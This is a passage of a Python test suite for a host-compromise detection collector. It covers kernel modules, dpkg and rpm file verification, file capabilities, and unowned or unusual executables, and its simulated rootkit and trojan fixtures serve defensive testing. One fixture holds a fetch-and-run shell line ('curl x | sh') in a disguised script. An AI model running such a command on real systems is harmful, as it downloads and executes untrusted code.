        self.write("proc/sys/kernel/modules_disabled", b"0\n")
        records = collect(self.root, ["kernel_modules"])
        mods = {m["name"]: m for m in records_named(records, "kernel_module")}
        self.assertEqual(mods["rootkit"]["taint"], "OE")
        self.assertEqual(mods["rootkit"]["sys_taint"], "OE")
        self.assertEqual(mods["ext4"]["used_by"], ["jbd2", "mbcache"])
        self.assertEqual(
            (mods["leaving"]["refcount"], mods["leaving"]["taint"], mods["leaving"]["transition"]),
            (-1, "OE", "unloading"),
        )
        self.assertEqual(
            (mods["arriving"]["taint"], mods["arriving"]["transition"]), ("", "loading")
        )
        self.assertNotIn("0xffff", json.dumps(records))  # load addresses are left out
        self.assertEqual(len(records_named(records, "unparsed_line")), 1)
        policy = records_named(records, "module_policy")[0]
        self.assertEqual((policy["sig_enforce"], policy["modules_disabled"]), ("N", "0"))
        self.assertIsNone(policy["lockdown"])

    def test_missing_proc_modules_is_an_error(self):
        records = collect(self.root, ["kernel_modules"])
        self.assertEqual(records[-1]["modules"]["kernel_modules"]["status"], "error")


def md5hex(data):
    return hashlib.md5(data, usedforsecurity=False).hexdigest()  # dpkg's format


class PackageVerifyTests(FixtureRoot):
    def dpkg_fixture(self):
        self.write(
            "var/lib/dpkg/status",
            b"Package: openssh-server\nStatus: install ok installed\n"
            b"Conffiles:\n /etc/ssh/moduli " + md5hex(b"moduli\n").encode() + b"\n"
            b" /etc/ssh/old.conf 0123456789abcdef0123456789abcdef obsolete\n"
            b"Description: x\n",
        )
        self.write("etc/ssh/moduli", b"edited\n")  # an administrator's edit
        good = b"\x7fELF ls"
        self.write("usr/bin/ls", good)
        self.write("usr/bin/ps", b"\x7fELF trojaned ps")
        self.write("usr/share/doc/coreutils/README", b"doc")
        self.write("usr/bin/dash.distrib", b"real dash")
        self.write(
            "var/lib/dpkg/info/coreutils.md5sums",
            (
                f"{md5hex(good)}  usr/bin/ls\n"
                f"{md5hex(b'original ps')}  usr/bin/ps\n"
                f"{md5hex(b'gone')}  usr/bin/gone\n"
                f"{md5hex(b'doc')}  usr/share/doc/coreutils/README\n"
                "not a line\n"
            ).encode(),
        )
        self.write(
            "var/lib/dpkg/info/dash:amd64.md5sums",
            f"{md5hex(b'real dash')}  usr/bin/dash\n".encode(),
        )
        self.write("var/lib/dpkg/diversions", b"/usr/bin/dash\n/usr/bin/dash.distrib\nlocal-pkg\n")

    def test_dpkg_sends_only_differences(self):
        self.dpkg_fixture()
        records = collect(self.root, ["package_verify"])
        changed = {r["path"]: r for r in records_named(records, "package_file_changed")}
        self.assertEqual(sorted(changed), ["/usr/bin/gone", "/usr/bin/ps"])
        self.assertEqual(changed["/usr/bin/ps"]["result"], "changed")
        self.assertEqual(changed["/usr/bin/gone"]["result"], "missing")
        conf = records_named(records, "conffile_changed")
        self.assertEqual([(c["path"], c["result"]) for c in conf], [("/etc/ssh/moduli", "changed")])
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["files"], 5)
        self.assertEqual(summary["malformed_lines"], 1)
        self.assertEqual(summary["critical_checked"], summary["critical_files"])
        self.assertFalse(summary["truncated"])
        self.assertEqual(records_named(records, "package_managers")[0], {"rpm": [], "dpkg": True})
        self.assertEqual(sources(records), {})  # no file content is sent
        self.assertEqual(records[-1]["modules"]["package_verify"]["status"], "ok")
        # The checksum lists themselves are listed with hashes, so a rewrite
        # (to cover a replaced file) shows against the baseline.
        stores = {r["path"]: r for r in records_named(records, "checksum_store")}
        lists = stores["/var/lib/dpkg/info/coreutils.md5sums"]
        self.assertEqual(
            lists["sha256"],
            hashlib.sha256(
                Path(self.root, "var/lib/dpkg/info/coreutils.md5sums").read_bytes()
            ).hexdigest(),
        )
        self.assertIn("ctime", lists)

    def run_patched(self, **attributes):
        collector = load_collector(self.root)
        for name, value in attributes.items():
            setattr(collector, name, value)
        out = io.BytesIO()
        collector.main(settings(["package_verify"]), out=out)
        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]

    def test_protected_files_named_in_a_list_are_never_hashed(self):
        self.dpkg_fixture()
        self.write("etc/passwd", b"jch:x:1000:1000::/home/jch:/bin/bash\n")
        self.write("etc/shadow", b"root:*:1::::::\n")
        self.write("home/jch/.bash_history", b"secret\n")
        os.link(Path(self.root, "etc/shadow"), Path(self.root, "usr/bin/shadowcopy"))
        self.write(
            "var/lib/dpkg/info/evil.md5sums",
            (
                f"{md5hex(b'x')}  etc/shadow\n"
                f"{md5hex(b'x')}  home/jch/.bash_history\n"
                f"{md5hex(b'x')}  usr/bin/shadowcopy\n"
            ).encode(),
        )
        records = collect(self.root, ["package_verify"])
        refused = {
            r["path"]
            for r in records_named(records, "package_file_changed")
            if r["result"] == "refused"
        }
        self.assertEqual(refused, {"/etc/shadow", "/home/jch/.bash_history", "/usr/bin/shadowcopy"})
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["files_result"]["refused"], 3)

    def test_status_file_is_a_checksum_store_too(self):
        self.dpkg_fixture()
        records = collect(self.root, ["package_verify"])
        stores = {r["path"]: r for r in records_named(records, "checksum_store")}
        status = Path(self.root, "var/lib/dpkg/status").read_bytes()
        self.assertEqual(
            stores["/var/lib/dpkg/status"]["sha256"], hashlib.sha256(status).hexdigest()
        )

    def test_malformed_list_lines_make_the_result_incomplete(self):
        self.dpkg_fixture()  # its coreutils list has one malformed line
        records = collect(self.root, ["package_verify"])
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["malformed_lines"], 1)
        self.assertFalse(summary["complete"])

    def test_status_file_hash_follows_the_protection_rules(self):
        self.dpkg_fixture()
        os.remove(Path(self.root, "var/lib/dpkg/status"))
        self.write("etc/shadow", b"root:*:1::::::\n")
        os.link(Path(self.root, "etc/shadow"), Path(self.root, "var/lib/dpkg/status"))
        records = collect(self.root, ["package_verify"])
        stores = {r["path"]: r for r in records_named(records, "checksum_store")}
        self.assertNotIn("sha256", stores["/var/lib/dpkg/status"])
        self.assertIn("refused", stores["/var/lib/dpkg/status"]["hash_skipped"])
        summary = records_named(records, "package_verify_summary")[0]
        self.assertTrue(summary["status_refused"])  # not parsed either
        self.assertFalse(summary["complete"])
        self.assertEqual(records_named(records, "conffile_changed"), [])

    def test_a_list_linked_to_a_protected_file_is_not_read(self):
        self.dpkg_fixture()
        self.write("etc/shadow", f"{md5hex(b'x')}  etc/CanaryShadowPath\n".encode())
        os.link(Path(self.root, "etc/shadow"), Path(self.root, "var/lib/dpkg/info/evil.md5sums"))
        records = collect(self.root, ["package_verify"])
        self.assertNotIn("CanaryShadowPath", json.dumps(records))
        summary = records_named(records, "package_verify_summary")[0]
        self.assertIn("evil.md5sums", summary["lists_unreadable"])

    def test_gaps_are_never_reported_as_complete(self):
        self.dpkg_fixture()
        Path(self.root, "var/lib/dpkg/info/broken.md5sums").mkdir()  # can't be read as a file
        records = collect(self.root, ["package_verify"])
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["lists_unreadable"], ["broken.md5sums"])
        self.assertFalse(summary["complete"])

    def test_entry_cap_stops_all_lists(self):
        self.dpkg_fixture()
        records = self.run_patched(MAX_PACKAGE_FILES=2)
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["files"], 2)
        self.assertTrue(summary["listing_truncated"])
        self.assertFalse(summary["complete"])

    def test_unreadable_status_file_is_an_error(self):
        self.dpkg_fixture()
        os.remove(Path(self.root, "var/lib/dpkg/status"))
        Path(self.root, "var/lib/dpkg/status").mkdir()
        records = collect(self.root, ["package_verify"])
        self.assertEqual(records[-1]["modules"]["package_verify"]["status"], "error")

    def test_files_left_out_by_path_exclude_are_not_missing(self):
        self.dpkg_fixture()
        self.write(
            "etc/dpkg/dpkg.cfg.d/excludes",
            b"path-exclude=/usr/share/doc/*\npath-include=/usr/share/doc/*/copyright\n"
            b"path-exclude /usr/bin/gon*\n",
        )
        os.remove(Path(self.root, "usr/share/doc/coreutils/README"))
        records = collect(self.root, ["package_verify"])
        changed = sorted(r["path"] for r in records_named(records, "package_file_changed"))
        self.assertEqual(changed, ["/usr/bin/ps"])  # gone and README were never installed
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["files_result"]["excluded"], 2)

    def test_path_filters_last_match_wins(self):
        collector = load_collector(self.root)
        filters = [(True, "/usr/share/doc/*"), (False, "/usr/share/doc/*/copyright")]
        self.assertTrue(collector.dpkg_excluded(filters, "/usr/share/doc/x/README"))
        self.assertFalse(collector.dpkg_excluded(filters, "/usr/share/doc/x/copyright"))
        self.assertFalse(collector.dpkg_excluded(filters, "/usr/bin/ls"))

    def test_data_files_are_checked_for_presence_not_hashed(self):
        self.dpkg_fixture()
        self.write("usr/share/doc/coreutils/README", b"edited docs")  # wrong contents
        self.write("usr/lib/firmware/x.bin", b"blob")
        self.write(
            "var/lib/dpkg/info/fw.md5sums",
            (
                f"{md5hex(b'other')}  usr/lib/firmware/x.bin\n"
                f"{md5hex(b'gone')}  usr/share/man/man1/gone.1.gz\n"
            ).encode(),
        )
        records = collect(self.root, ["package_verify"])
        changed = {r["path"]: r["result"] for r in records_named(records, "package_file_changed")}
        self.assertNotIn("/usr/share/doc/coreutils/README", changed)
        self.assertNotIn("/usr/lib/firmware/x.bin", changed)
        self.assertEqual(changed["/usr/share/man/man1/gone.1.gz"], "missing")
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(summary["files_result"]["not_hashed"], 2)

    def test_critical_paths_are_checked_first(self):
        collector = load_collector(self.root)
        entries = [
            ("a", "/usr/share/doc/x/README", "0"),
            ("a", "/usr/lib/python3/x.py", "0"),
            ("a", "/usr/sbin/sshd", "0"),
            ("a", "/usr/lib/x86_64-linux-gnu/security/pam_unix.so", "0"),
        ]
        ordered = [e[1] for e in sorted(entries, key=collector._package_order)]
        self.assertEqual(
            ordered[:2], ["/usr/sbin/sshd", "/usr/lib/x86_64-linux-gnu/security/pam_unix.so"]
        )
        self.assertEqual(ordered[-1], "/usr/share/doc/x/README")

    def test_time_limit_is_reported(self):
        self.dpkg_fixture()
        records = collect(self.root, ["package_verify"], module_seconds=1e-9)
        self.assertEqual(records[-1]["modules"]["package_verify"]["status"], "timeout")


def rpm_header(entries):
    """An rpm header blob, built independently of the collector: entries
    are (tag, type, value); type 4 int32, 3 int16, 6 string, 8 string array."""
    index, data = [], b""
    for tag, kind, value in entries:
        if kind in (2, 3, 4):
            width = {2: 1, 3: 2, 4: 4}[kind]
            data += b"\0" * (-len(data) % width)
            offset = len(data)
            data += b"".join(v.to_bytes(width, "big") for v in value)
            count = len(value)
        elif kind == 6:
            offset, count = len(data), 1
            data += value.encode() + b"\0"
        else:
            offset, count = len(data), len(value)
            data += b"".join(v.encode() + b"\0" for v in value)
        index.append(struct.pack(">iiii", tag, kind, offset, count))
    return struct.pack(">II", len(index), len(data)) + b"".join(index) + data


def rpm_package(name, files):
    """files: (path, content or None for a link/dir, mode, flags, link)."""
    dirs = sorted({f[0].rsplit("/", 1)[0] + "/" for f in files})
    return rpm_header(
        [
            (1000, 6, name),
            (1030, 3, [f[2] for f in files]),
            (
                1035,
                8,
                [hashlib.sha256(f[1]).hexdigest() if f[1] is not None else "" for f in files],
            ),
            (1036, 8, [f[4] for f in files]),
            (1037, 4, [f[3] for f in files]),
            (1029, 2, [f[5] if len(f) > 5 else 0 for f in files]),  # int8 states
            (1116, 4, [dirs.index(f[0].rsplit("/", 1)[0] + "/") for f in files]),
            (1117, 8, [f[0].rsplit("/", 1)[1] for f in files]),
            (1118, 8, dirs),
            (5011, 4, [8]),
            (1039, 8, [f[6] if len(f) > 6 else "root" for f in files]),  # owners
            (1040, 8, ["root"] * len(files)),  # groups
            (5010, 8, [f[7] if len(f) > 7 else "" for f in files]),  # capabilities
        ]
    )


class RpmVerifyTests(FixtureRoot):
    def rpm_fixture(self, wal=b""):
        # ping should have cap_net_raw but has none: rpm -V's "P".
        import sqlite3

        good = b"\x7fELF sshd"
        self.write("usr/sbin/sshd", good)
        self.write("usr/bin/ps", b"\x7fELF trojaned")
        self.write("usr/bin/passwd", b"\x7fELF passwd")
        for name in ("usr/sbin/sshd", "usr/bin/ps"):
            Path(self.root, name).chmod(0o755)
        Path(self.root, "usr/bin/passwd").chmod(0o4755)  # SUID added
        self.write("etc/ssh/sshd_config", b"edited\n")
        Path(self.root, "etc/ssh/sshd_config").chmod(0o600)
        os.symlink("/opt/evil", Path(self.root, "usr/bin/vi"))
        files = (
            [
                ("/usr/sbin/sshd", good, 0o100755, 0, ""),
                ("/usr/bin/ps", b"\x7fELF ps", 0o100755, 0, ""),
                ("/usr/bin/passwd", b"\x7fELF passwd", 0o100755, 0, ""),
                ("/usr/bin/gone", b"x", 0o100755, 0, ""),
                ("/usr/bin/optional", b"x", 0o100644, 8, ""),  # %missingok
                ("/var/cache/ghost", b"x", 0o100644, 64, ""),  # %ghost
                ("/etc/ssh/sshd_config", b"original\n", 0o100600, 1, ""),  # %config
                ("/usr/bin/vi", None, 0o120777, 0, "vim"),
                ("/usr/share/doc/x/README", b"x", 0o100644, 2, "", 2),  # not installed (nodocs)
                ("/usr/bin/su", b"\x7fELF su", 0o100755, 0, "", 0, "daemon"),  # owner changed
                ("/usr/share/man/man1/ps.1.gz", b"original man", 0o100644, 0, ""),  # data
                ("/usr/sbin/sshd", good, 0o100755, 0, "", 0, "root", ""),
            ][:-1]
            + [
                ("/usr/bin/ping", b"\x7fELF ping", 0o100755, 0, "", 0, "root", "cap_net_raw=ep"),
            ]
        )
        self.write("usr/bin/ping", b"\x7fELF ping")
        Path(self.root, "usr/bin/ping").chmod(0o755)
        self.write("usr/share/man/man1/ps.1.gz", b"different man page")
        self.write("usr/bin/su", b"\x7fELF su")
        Path(self.root, "usr/bin/su").chmod(0o755)
        # The files here belong to whoever runs the tests: call that root.
        self.write(
            "etc/passwd",
            f"root:x:{os.getuid()}:{os.getgid()}::/root:/bin/bash\ndaemon:x:1:1::/:/sbin/nologin\n".encode(),
        )
        self.write("etc/group", f"root:x:{os.getgid()}:\n".encode())
        Path(self.root, "var/lib/rpm").mkdir(parents=True)
        database = Path(self.root, "var/lib/rpm/rpmdb.sqlite")
        connection = sqlite3.connect(database)
        connection.execute("PRAGMA journal_mode=WAL")  # as RHEL's rpm uses it
        connection.execute("CREATE TABLE Packages (hnum INTEGER PRIMARY KEY, blob BLOB)")
        connection.execute("INSERT INTO Packages (blob) VALUES (?)", (rpm_package("base", files),))
        connection.execute("INSERT INTO Packages (blob) VALUES (?)", (b"\0\0\0\5garbage",))
        connection.execute(
            "INSERT INTO Packages (blob) VALUES (?)", (rpm_header([(1000, 6, "gpg-pubkey")]),)
        )
        connection.commit()
        connection.close()
        if wal:
            self.write("var/lib/rpm/rpmdb.sqlite-wal", wal)
        return database

    def test_rpm_checks_from_its_database(self):
        database = self.rpm_fixture()
        before = sorted(os.listdir(database.parent))
        records = collect(self.root, ["package_verify"])
        self.assertEqual(sorted(os.listdir(database.parent)), before)  # no -shm or -wal made
        changed = {(r["path"], r["result"]) for r in records_named(records, "package_file_changed")}
        self.assertEqual(
            changed,
            {
                ("/usr/bin/ps", "changed"),
                ("/usr/bin/gone", "missing"),
                ("/usr/bin/passwd", "mode"),
                ("/usr/bin/vi", "link"),
                ("/usr/bin/su", "owner"),
                ("/usr/bin/ping", "capabilities"),
            },
        )
        owner = [
            r for r in records_named(records, "package_file_changed") if r["result"] == "owner"
        ][0]
        self.assertEqual((owner["expected_owner"], owner["owner"]), ("daemon", "root"))
        mode = [r for r in records_named(records, "package_file_changed") if r["result"] == "mode"][
            0
        ]
        self.assertEqual((mode["expected_mode"], mode["mode"]), ("100755", "104755"))
        conf = records_named(records, "conffile_changed")
        self.assertEqual(
            [(c["path"], c["result"]) for c in conf], [("/etc/ssh/sshd_config", "changed")]
        )
        summary = records_named(records, "package_verify_summary")[0]
        self.assertEqual(
            (summary["manager"], summary["packages"], summary["malformed_headers"]), ("rpm", 1, 1)
        )
        self.assertEqual(summary["critical_checked"], summary["critical_files"])
        self.assertFalse(summary["wal_pending"])
        self.assertFalse(summary["complete"])  # one malformed header: a gap
        self.assertEqual(summary["files_result"]["not_hashed"], 1)  # the man page
        self.assertEqual(sources(records), {})
        self.assertEqual(records[-1]["modules"]["package_verify"]["status"], "ok")

    def test_entry_cap_is_reported(self):
        self.rpm_fixture()
        collector = load_collector(self.root)
        collector.MAX_PACKAGE_FILES = 0
        out = io.BytesIO()
        collector.main(settings(["package_verify"]), out=out)
        records = [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]
        summary = records_named(records, "package_verify_summary")[0]
        self.assertTrue(summary["listing_truncated"])
        self.assertFalse(summary["complete"])

    def test_pending_write_ahead_log_is_reported(self):
        self.rpm_fixture(wal=b"not empty")
        records = collect(self.root, ["package_verify"])
        self.assertTrue(records_named(records, "package_verify_summary")[0]["wal_pending"])

    def test_hostile_header_offsets_are_contained(self):
        collector = load_collector(self.root)
        blob = struct.pack(">II", 1, 4) + struct.pack(">iiii", 1117, 8, 2, 1000) + b"ab\0\0"
        header = collector.RpmHeader(blob)
        with self.assertRaises(ValueError):
            header.get(1117)
        with self.assertRaises(ValueError):
            collector.RpmHeader(struct.pack(">II", 5, 99))


def vfs_cap(permitted, inheritable=0, effective=True, revision=2, root=None):
    """A security.capability value, built independently of the collector."""
    magic = {1: 0x01000000, 2: 0x02000000, 3: 0x03000000}[revision] | (1 if effective else 0)
    data = magic.to_bytes(4, "little")
    for half in range(1 if revision == 1 else 2):
        data += ((permitted >> (32 * half)) & 0xFFFFFFFF).to_bytes(4, "little")
        data += ((inheritable >> (32 * half)) & 0xFFFFFFFF).to_bytes(4, "little")
    if revision == 3:
        data += (root or 0).to_bytes(4, "little")
    return data


class CapabilityTests(unittest.TestCase):
    def setUp(self):
        self.collector = load_collector("/nonexistent")

    def test_decode_each_revision(self):
        decode = self.collector.decode_capabilities
        self.assertEqual(decode(vfs_cap(1 << 13)), ({"cap_net_raw": "ep"}, None))
        self.assertEqual(
            decode(vfs_cap(1 << 7, revision=1, effective=False)), ({"cap_setuid": "p"}, None)
        )
        caps, root = decode(vfs_cap(1 << 21, inheritable=1 << 21, revision=3, root=100000))
        self.assertEqual((caps, root), ({"cap_sys_admin": "eip"}, 100000))
        self.assertEqual(decode(vfs_cap(1 << 40))[0], {"cap_checkpoint_restore": "ep"})
        self.assertEqual(decode(vfs_cap(1 << 50))[0], {"cap_50": "ep"})

    def test_malformed_values_are_rejected(self):
        for raw in (b"", b"\0\0\0\x09" + b"\0" * 16, vfs_cap(1)[:-1], vfs_cap(1) + b"x"):
            with self.assertRaises(ValueError, msg=raw):
                self.collector.decode_capabilities(raw)

    def test_attribute_read_errors_are_not_no_capabilities(self):
        from unittest import mock

        with mock.patch("os.getxattr", side_effect=OSError(errno.EIO, "I/O error")):
            with self.assertRaises(ValueError):
                self.collector.file_capabilities("/usr/bin/x")
        with mock.patch("os.getxattr", side_effect=OSError(errno.ENODATA, "No data")):
            self.assertEqual(self.collector.file_capabilities("/usr/bin/x"), ({}, None))

    def test_libcap_numbers_for_unnamed_capabilities(self):
        parse = self.collector.parse_capabilities_text
        self.assertEqual(parse("41=ep"), {"cap_41": "ep"})
        self.assertEqual(parse("13=ep"), {"cap_net_raw": "ep"})

    def test_text_round_trip(self):
        text = self.collector.capabilities_text(
            {"cap_net_raw": "ep", "cap_net_admin": "ep", "cap_sys_time": "p"}
        )
        self.assertEqual(text, "cap_net_admin,cap_net_raw=ep cap_sys_time=p")
        parse = self.collector.parse_capabilities_text
        self.assertEqual(
            parse(text), {"cap_net_admin": "ep", "cap_net_raw": "ep", "cap_sys_time": "p"}
        )
        self.assertEqual(parse("cap_net_raw+ep"), {"cap_net_raw": "ep"})
        self.assertEqual(parse("cap_net_raw=ep cap_net_raw-e"), {"cap_net_raw": "p"})
        self.assertEqual(parse(""), {})
        self.assertEqual(len(parse("=ep")), len(self.collector.CAP_NAMES))
        with self.assertRaises(ValueError):
            parse("cap net raw")


class SystemFilesTests(FixtureRoot):
    def fixture(self):
        self.write("var/lib/dpkg/status", b"Package: coreutils\n")
        self.write(
            "var/lib/dpkg/info/coreutils.list",
            b"/.\n/bin\n/bin/ls\n/usr/bin/passwd\n/usr/bin/ping\n",
        )
        os.symlink("usr/bin", Path(self.root, "bin"))
        for name, mode in (
            ("usr/bin/ls", 0o755),
            ("usr/bin/passwd", 0o4755),
            ("usr/bin/ping", 0o755),
            ("usr/bin/evil", 0o755),
            ("usr/bin/rootshell", 0o4755),
            ("usr/lib/x86_64-linux-gnu/libhide.so", 0o755),
            ("usr/local/bin/tool", 0o755),
            ("usr/share/doc/x/README", 0o644),
            ("opt/app/run", 0o755),
            ("etc/cron.daily/job", 0o755),
        ):
            self.write(name, b"\x7fELF " + name.encode()).chmod(mode)

    def run_with(self, caps=None, **attributes):
        collector = load_collector(self.root)
        if caps is not None:
            collector.file_capabilities = lambda absolute: (caps.get(absolute, {}), None)
        for name, value in attributes.items():
            setattr(collector, name, value)
        out = io.BytesIO()
        collector.main(settings(["system_files"]), out=out)
        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]

    def test_privileged_capable_and_unowned_files(self):
        self.fixture()
        records = self.run_with(caps={"/usr/bin/ping": {"cap_net_raw": "ep"}})
        privileged = {r["path"]: r for r in records_named(records, "privileged_file")}
        unowned = {r["path"]: r for r in records_named(records, "unowned_executable")}
        # /bin links into /usr: each file is reported once.
        self.assertEqual(len(records_named(records, "privileged_file")), len(privileged))
        self.assertEqual(len(records_named(records, "unowned_executable")), len(unowned))
        self.assertEqual(
            sorted(privileged), ["/usr/bin/passwd", "/usr/bin/ping", "/usr/bin/rootshell"]
        )
        self.assertEqual(privileged["/usr/bin/passwd"]["package"], "coreutils")  # via merged /bin
        self.assertTrue(privileged["/usr/bin/rootshell"]["setuid"])
        self.assertIsNone(privileged["/usr/bin/rootshell"]["package"])
        self.assertEqual(privileged["/usr/bin/ping"]["capabilities"], "cap_net_raw=ep")
        self.assertEqual(
            sorted(unowned),
            [
                "/opt/app/run",
                "/usr/bin/evil",
                "/usr/lib/x86_64-linux-gnu/libhide.so",
                "/usr/local/bin/tool",
            ],
        )
        self.assertTrue(unowned["/usr/local/bin/tool"]["local"])
        self.assertFalse(unowned["/usr/bin/evil"]["local"])
        self.assertEqual(
            unowned["/usr/bin/evil"]["sha256"],
            hashlib.sha256(b"\x7fELF usr/bin/evil").hexdigest(),
        )
        summary = records_named(records, "system_files_summary")[0]
        self.assertEqual(summary["owners"], "dpkg")
        self.assertEqual(summary["merged_dirs"], {"/bin": "/usr/bin"})
        self.assertEqual(sources(records), {})
        self.assertEqual(records[-1]["modules"]["system_files"]["status"], "ok")

    def test_each_kind_has_its_own_limit(self):
        self.fixture()
        records = self.run_with(caps={}, MAX_FILE_FINDINGS=1)
        self.assertEqual(len(records_named(records, "privileged_file")), 1)
        self.assertEqual(len(records_named(records, "unowned_executable")), 1)
        self.assertEqual(
            records_named(records, "system_files_summary")[0]["truncated_reason"], "findings"
        )

    def test_without_a_package_manager_nothing_is_called_unowned(self):
        self.fixture()
        os.remove(Path(self.root, "var/lib/dpkg/status"))
        records = self.run_with(caps={})
        self.assertEqual(records_named(records, "unowned_executable"), [])
        self.assertEqual(len(records_named(records, "privileged_file")), 2)
        self.assertIsNone(records_named(records, "system_files_summary")[0]["owners"])

    def test_local_diversion_makes_the_replacement_unowned(self):
        self.fixture()
        with open(Path(self.root, "var/lib/dpkg/info/coreutils.list"), "a") as listing:
            listing.write("/usr/bin/sudo\n")
        self.write("usr/bin/sudo.distrib", b"\x7fELF real sudo").chmod(0o4755)
        self.write("usr/bin/sudo", b"\x7fELF trojan").chmod(0o4755)
        self.write("var/lib/dpkg/diversions", b"/usr/bin/sudo\n/usr/bin/sudo.distrib\n:\n")
        records = self.run_with(caps={})
        found = {r["path"]: r for r in records_named(records, "privileged_file")}
        self.assertIsNone(found["/usr/bin/sudo"]["package"])  # never credited to coreutils
        self.assertEqual(found["/usr/bin/sudo"]["diverted_by"], ":")
        self.assertEqual(found["/usr/bin/sudo.distrib"]["package"], "coreutils")

    def test_package_diversion_credits_the_diverting_package(self):
        self.fixture()
        with open(Path(self.root, "var/lib/dpkg/info/coreutils.list"), "a") as listing:
            listing.write("/usr/bin/vi\n")
        self.write("var/lib/dpkg/info/vim.list", b"/usr/bin/vi\n")
        self.write("usr/bin/vi", b"\x7fELF vim").chmod(0o755)
        self.write("usr/bin/vi.orig", b"\x7fELF vi").chmod(0o755)
        self.write("var/lib/dpkg/diversions", b"/usr/bin/vi\n/usr/bin/vi.orig\nvim\n")
        records = self.run_with(caps={})
        unowned = {r["path"] for r in records_named(records, "unowned_executable")}
        self.assertNotIn("/usr/bin/vi", unowned)
        self.assertNotIn("/usr/bin/vi.orig", unowned)

    def test_diversion_claimed_under_the_merged_usr_path(self):
        # Ubuntu's t64 transition: the old package listed /lib/..., the new
        # one diverts that path and lists the file as /usr/lib/....
        self.fixture()
        os.symlink("usr/lib", Path(self.root, "lib"))
        with open(Path(self.root, "var/lib/dpkg/info/coreutils.list"), "a") as listing:
            listing.write("/lib/x86_64-linux-gnu/libe2p.so.2.3\n")
        self.write(
            "var/lib/dpkg/info/libext2fs2t64.list", b"/usr/lib/x86_64-linux-gnu/libe2p.so.2.3\n"
        )
        self.write("usr/lib/x86_64-linux-gnu/libe2p.so.2.3", b"\x7fELF e2p").chmod(0o644)
        self.write(
            "var/lib/dpkg/diversions",
            b"/lib/x86_64-linux-gnu/libe2p.so.2.3\n"
            b"/lib/x86_64-linux-gnu/libe2p.so.2.3.usr-is-merged\nlibext2fs2t64\n",
        )
        records = self.run_with(caps={})
        unowned = {r["path"] for r in records_named(records, "unowned_executable")}
        self.assertNotIn("/usr/lib/x86_64-linux-gnu/libe2p.so.2.3", unowned)

    def test_damaged_package_database_never_cancels_the_walk(self):
        self.fixture()
        os.remove(Path(self.root, "var/lib/dpkg/status"))
        self.write("var/lib/rpm/rpmdb.sqlite", b"not a database at all")
        records = self.run_with(caps={})
        summary = records_named(records, "system_files_summary")[0]
        self.assertIsNone(summary["owners"])
        self.assertIn("Error", summary["owners_problem"])
        self.assertEqual(len(records_named(records, "privileged_file")), 2)  # still reported
        self.assertEqual(records[-1]["modules"]["system_files"]["status"], "ok")

    def test_unowned_shared_library_without_execute_bit(self):
        self.fixture()
        self.write("usr/lib/x86_64-linux-gnu/libprocesshider.so", b"\x7fELF hide").chmod(0o644)
        self.write("usr/lib/x86_64-linux-gnu/notes.txt", b"x").chmod(0o644)
        records = self.run_with(caps={})
        unowned = {r["path"] for r in records_named(records, "unowned_executable")}
        self.assertIn("/usr/lib/x86_64-linux-gnu/libprocesshider.so", unowned)
        self.assertNotIn("/usr/lib/x86_64-linux-gnu/notes.txt", unowned)

    def test_opt_moved_under_var_is_still_local(self):
        self.fixture()
        shutil.rmtree(Path(self.root, "opt"))
        self.write("var/opt/app/run", b"\x7fELF app").chmod(0o755)
        os.symlink("var/opt", Path(self.root, "opt"))
        records = self.run_with(caps={})
        unowned = {r["path"]: r for r in records_named(records, "unowned_executable")}
        self.assertTrue(unowned["/var/opt/app/run"]["local"])

    def test_limits_are_reported_and_dropped_findings_counted(self):
        self.fixture()
        records = self.run_with(caps={}, MAX_FILE_FINDINGS=1)
        summary = records_named(records, "system_files_summary")[0]
        self.assertEqual(summary["dropped"]["unowned_executable"], 3)
        self.assertEqual(summary["counts"]["unowned"], 5)  # counted past the limit (rootshell too)
        records = self.run_with(caps={}, MAX_SYSTEM_ENTRIES=3)
        summary = records_named(records, "system_files_summary")[0]
        self.assertEqual(summary["truncated_reason"], "entries")

    def test_hard_linked_finding_is_not_hashed(self):
        self.fixture()
        self.write("var/lib/secret", b"CanaryLinked")
        os.link(Path(self.root, "var/lib/secret"), Path(self.root, "usr/local/bin/linked"))
        Path(self.root, "usr/local/bin/linked").chmod(0o755)
        records = self.run_with(caps={}, PACKAGE_OWNER_UID=os.getuid())
        found = {r["path"]: r for r in records_named(records, "unowned_executable")}
        self.assertNotIn("sha256", found["/usr/local/bin/linked"])
        self.assertIn("hard-linked", found["/usr/local/bin/linked"]["hash_skipped"])

    def test_real_capability_attribute(self):
        target = self.write("usr/bin/capped", b"x")
        try:
            os.setxattr(target, "security.capability", vfs_cap(1 << 7))
        except OSError:
            self.skipTest("setting security.capability needs root (CAP_SETFCAP)")
        records = self.run_with()
        found = {r["path"]: r for r in records_named(records, "privileged_file")}
        self.assertEqual(found["/usr/bin/capped"]["capabilities"], "cap_setuid=ep")


def unusual_settings(web_roots=None):
    value = json.loads(settings(["unusual_files"]))
    if web_roots is not None:
        value["web_roots"] = web_roots
    return json.dumps(value)


class UnusualFilesTests(FixtureRoot):
    def run_unusual(self, web_roots=None):
        collector = load_collector(self.root)
        collector.file_capabilities = lambda absolute: ({}, None)
        out = io.BytesIO()
        collector.main(unusual_settings(web_roots), out=out)
        return [json.loads(x) for x in gzip.decompress(out.getvalue()).splitlines()]

    def scratch_fixture(self):
        self.write("tmp/.x/payload", b"\x7fELF miner").chmod(0o755)
        self.write("tmp/kworker", b"#!/bin/sh\ncurl x | sh\n").chmod(0o755)
        self.write("tmp/[kthreadd]", b"\x7fELF").chmod(0o644)
        Path(self.root, "tmp/...").mkdir()
        self.write("tmp/notes.txt", b"just text")
        old = self.write("tmp/backdated", b"\x7fELF", age_days=400)
        old.chmod(0o755)  # changes ctime to now; mtime stays 400 days old
        self.write("tmp/rootsh", b"\x7fELF sh").chmod(0o4755)
        self.write("var/tmp/stash.tar", b"tar")
        self.write("dev/shm/.s", b"\x7fELF").chmod(0o755)
        self.write("dev/.udev-rootkit/lib.so", b"\x7fELF")
        self.write("dev/sdz", b"not a device")  # a regular file in /dev

